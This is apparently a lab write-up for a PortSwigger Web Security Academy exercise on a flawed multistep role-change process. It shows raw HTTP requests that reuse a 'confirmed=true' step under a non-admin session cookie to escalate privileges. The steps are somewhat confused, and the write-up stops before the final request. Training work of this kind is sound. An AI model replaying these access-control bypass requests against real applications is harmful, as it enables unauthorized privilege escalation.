## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/2b3b072d-aeaf-4368-bc25-5daadcd9f6ca)


## Solution :

First  can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`. 

Then we can play around with the requests by loggin in as wiener & exploiting the flaw in the multistep process.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/e8440ea8-045e-4bc0-a922-053fb4fc4cc1)

Once logged in , we can go to admin panel & modify other user's privileges.

We need to upgrade wiener as admin by flawed multistep process, so lets now poke around with carlos.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/5bdb0c20-cff4-400b-9744-b231cfa22bd2)

```http
POST /admin-roles HTTP/2
Host: 0abc000b0491b2cb883aa3c000610098.web-security-academy.net
Cookie: session=ZpyoZWrt5YplfvsXMA2ayoFLn3iAX9GN
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://0abc000b0491b2cb883aa3c000610098.web-security-academy.net
Referer: https://0abc000b0491b2cb883aa3c000610098.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

username=carlos&action=upgrade
```

Here we upgreaded privileges of carlos.

After modifying the privileges, we get a page like this,

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/4d9ae4ad-3442-41a0-be2f-9a636b1cee9d)

```http
POST /admin-roles HTTP/2

Host: 0abc000b0491b2cb883aa3c000610098.web-security-academy.net
Cookie: session=ZpyoZWrt5YplfvsXMA2ayoFLn3iAX9GN
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: https://0abc000b0491b2cb883aa3c000610098.web-security-academy.net
Referer: https://0abc000b0491b2cb883aa3c000610098.web-security-academy.net/admin-roles
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

action=upgrade&confirmed=true&username=wiener
```
We here have the admin's cookie - `ZpyoZWrt5YplfvsXMA2ayoFLn3iAX9GN` by which we can send the same request but with non admin cookie

Here note that we have a parameter called `confirmed=true/false` in the POST request  body which takes us to **/admin** .

So now we can try logging in as  **carlos** using the credentials given & try to promote ourselves as administrator.

When we try to upgrade ourself(wiener) as administrator, we get an error stating that we are not admin to perform this action,

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/fa0de097-c33a-4a83-a28d-cf9fc7f85cc1)

Capture the above request and send it to repeater.

```http
POST /admin-roles HTTP/2

Host: 0abc000b0491b2cb883aa3c000610098.web-security-academy.net
Cookie: session=A59zxwt0kaZ2sHnkECl29XC9Mxpcetgq
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Origin: https://0abc000b0491b2cb883aa3c000610098.web-security-academy.net
Referer: https://0abc000b0491b2cb883aa3c000610098.web-security-academy.net/admin-roles
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers


action=downgrade&confirmed=true&username=wiener
```

Here we have the same request being sent, but this time we have the **cookie of wiener(non-admin)**.

Cookie of admin  - `ZpyoZWrt5YplfvsXMA2ayoFLn3iAX9GN` 
Cookie of wiener - `A59zxwt0kaZ2sHnkECl29XC9Mxpcetgq`


Let send the non admin request with the admin's session cookie.





